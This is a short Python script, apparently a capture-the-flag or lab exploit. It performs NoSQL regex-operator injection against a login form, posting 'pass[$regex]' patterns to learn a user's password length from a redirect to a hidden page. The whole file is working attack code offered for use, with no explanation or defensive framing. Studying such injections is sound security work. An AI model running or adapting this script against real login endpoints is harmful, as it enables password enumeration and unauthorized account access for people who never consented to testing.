import requests
import argparse

def main(url, user):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    for length in range(1, 21):
        payload = {
            'user': user,
            'pass[$regex]': f'^.{{{length}}}$',
            'remember': 'on'
        }

        try:
            response = requests.post(url, headers=headers, data=payload, allow_redirects=True)

            if '/sekr3tPl4ce.php' in response.url:
                print(f'The correct password length is: {length}')
                return
        
        except requests.RequestException as e:
            print(f'An error occurred: {e}')
            return

    print('No valid password length found in the range 1-20.')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Check password length by testing regex-based login attempts.')
    parser.add_argument('-u', '--url', type=str, required=True, help='The URL to send the POST request to.')
    parser.add_argument('-U', '--user', type=str, required=True, help='The user field value to use in the POST request.')

    args = parser.parse_args()

    if not args.url.startswith('http://') and not args.url.startswith('https://'):
        print("URL must start with 'http://' or 'https://'")
    else:
        main(args.url, args.user)
